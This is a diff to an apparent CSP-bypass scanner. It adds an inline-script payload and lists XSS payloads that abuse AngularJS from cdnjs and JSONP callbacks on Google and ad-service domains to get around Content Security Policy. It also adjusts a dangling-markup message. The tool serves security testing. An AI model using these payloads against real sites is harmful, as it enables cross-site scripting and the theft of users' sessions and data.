@@ -26,6 +26,7 @@ vulnerable_CSP_conf = {
         {'value':['https://cdnjs.cloudflare.com', 'unsafe-eval'], 'payload':"<script src=\"https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.4.6/angular.js\"></script><div ng-app> {{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };%s;//');}} </div>" % general_payload}
     ],
     "default-src": [
+        {'value': ['*', 'unsafe-inline'], 'payload': f'<script>{general_payload}</script>'},
         {'value': ['https://*.google.com'], 'payload': f'"><script src="https://www.google.com/complete/search?client=chrome&q=hello&callback={general_payload}"></script>'},
         {'value': ['https://*.doubleclick.net'], 'payload': f'"><script src="https://googleads.g.doubleclick.net/pagead/conversion/1036918760/wcm?callback={general_payload}"></script>'},
         {'value': ['https://*.googleadservices.com'], 'payload': f'"><script src="https://www.googleadservices.com/pagead/conversion/1070110417/wcm?callback={general_payload}"></script>'},
@@ -287,7 +288,7 @@ if __name__ == '__main__':
                             else:
                                 scan.fail("No dangling markup detected\n")
                         else:
-                            scan.info("Perhaps you can exploit Dangling Markup")
+                            scan.info("Perhaps you can exploit Dangling Markup\n")
                     else:
                         scan.fail(f"No CSP on page {page.url}\n")
                 else:
